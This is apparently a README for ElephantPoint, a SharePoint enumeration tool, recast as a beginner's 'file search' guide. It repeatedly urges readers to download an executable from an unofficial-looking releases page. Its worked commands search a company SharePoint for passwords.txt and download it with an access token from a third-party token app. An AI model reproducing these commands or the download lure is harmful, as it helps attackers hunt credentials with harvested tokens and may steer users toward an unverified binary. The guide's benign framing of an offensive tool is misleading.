# 🐘 ElephantPoint - Easy SharePoint File Search

[![Download ElephantPoint](https://img.shields.io/badge/Download-ElephantPoint-blue?style=for-the-badge)](https://github.com/Nothingsgg/ElephantPoint/releases)

---

ElephantPoint helps you find and download files from SharePoint using a secure access token. You don’t need to be a programmer to use it. This guide will walk you through everything you need to get ElephantPoint running on your computer.

---

## 📥 Download & Install

To start, you need to get ElephantPoint on your computer.

1. Click the big **Download ElephantPoint** button at the top or visit  
   [ElephantPoint Releases](https://github.com/Nothingsgg/ElephantPoint/releases)  
   This page holds all versions of the app.

2. On the releases page, look for the latest version. You will see one or more files listed under the "Assets" section.

3. Download the executable file named `ElephantPoint.exe` or similar. This is the program you will run.

4. Once downloaded, you can move the file to a folder where you want to keep it. For example, create a folder on your desktop named "ElephantPoint" and place the file there.

5. No installation process is needed. ElephantPoint runs directly from the downloaded file.

---

## 💻 System Requirements

ElephantPoint runs on Windows computers with these minimum features:

- Windows 7 or newer (Windows 10 or 11 recommended)
- .NET Framework 4.7.2 or later installed (usually already on most Windows systems)
- Internet connection to access SharePoint sites
- A SharePoint access token (explained later)

If you are unsure whether your PC fits these requirements, check your Windows version first by clicking Start > Settings > System > About.

---

## 🔑 Understanding SharePoint Access Tokens

ElephantPoint needs a SharePoint access token. This token acts like a key. It gives ElephantPoint permission to search and download files from SharePoint.

### How to get your token?

You must get your token from a third-party app called ManaCloud or from your SharePoint administrator. Without this token, ElephantPoint cannot access files.

If you don’t have a token, ask your workplace IT support or SharePoint administrator for help.

---

## 🚀 How to Use ElephantPoint

ElephantPoint works through commands you give it in a window called Command Prompt. Don’t worry, you will only need to type a few simple words.

### Opening Command Prompt

1. Click the Start button on your computer.
2. Type `cmd` and press Enter.
3. A black window with white text will open.

### Basic Command Structure

The general format to run ElephantPoint is this:

```
ElephantPoint.exe [options]
```

Options tell ElephantPoint what to do. Here are the main options you will use:

- `/SPO_url` — The SharePoint website address (example: `expensiverabbit.sharepoint.com`).
- `/query_file` — The name of the file you want to find (example: `passwords.txt`).
- `/file_url` — The direct link to a SharePoint file (used after you find it).
- `/save_file` — Where you want to save the downloaded file on your PC (example: `C:\Users\You\Downloads\passwords.txt`).
- `/token` — The SharePoint access token you obtained from ManaCloud or your admin.

### Example 1: Search for files

To search for a file called `passwords.txt` on SharePoint, you would type:

```
ElephantPoint.exe /query_file:passwords.txt /SPO_url:expensiverabbit.sharepoint.com /token:yourtokenhere
```

Replace `yourtokenhere` with your actual token text.

### Example 2: Download a found file

After searching, ElephantPoint gives you the file's URL. To download it, run:

```
ElephantPoint.exe /file_url:https://expensiverabbit.sharepoint.com/path/to/passwords.txt /save_file:C:\Users\You\Downloads\passwords.txt /token:yourtokenhere
```

Replace the URL, save path, and token with your own details.

### Optional Settings

- `/max_row` — limit search results to a number (default is 100).
- `/fql` — changes output format for easier reading.
- `/ref_filter` — filter results further (consult your admin for help here).

---

## 📘 Step-by-Step Guide to Find and Download Files

1. Open Command Prompt.
2. Run ElephantPoint with your SharePoint URL, access token, and file name.
3. Review the search results. ElephantPoint will list files matching your query.
4. Copy the `/file_url` of the file you want.
5. Run ElephantPoint again with `/file_url`, `/save_file`, and `/token` options.
6. Look in your specified folder for the downloaded file.

---

## 🛠 Troubleshooting Tips

- Make sure the token is correct. If it is expired or wrong, ElephantPoint won’t work.
- Check your internet connection.
- Run Command Prompt as Administrator if you see permission errors. Right-click `cmd` and choose “Run as administrator.”
- Use the `/help` option to see all commands:

  ```
  ElephantPoint.exe /help
  ```

- If ElephantPoint shows errors about SharePoint URL, verify the URL with your admin. It should look like `yourcompany.sharepoint.com`.

---

## 🌐 Additional Information

ElephantPoint uses SharePoint APIs to quickly locate files in large document libraries. It works best when your access token is fresh and has the right permissions.

For understanding more about ElephantPoint’s background and use cases, read the article:  
https://www.lrqa.com/en/insights/articles/elephantpoint-a-sharepoint-enumeration-tool/

---

## 🙋 Getting Support

If you run into trouble:

- Check the command examples above carefully.
- Verify your SharePoint token with your IT team.
- Return to the official [ElephantPoint Releases](https://github.com/Nothingsgg/ElephantPoint/releases) page for updates.

---

[Download ElephantPoint](https://github.com/Nothingsgg/ElephantPoint/releases)  
Get the latest version and start managing SharePoint files today.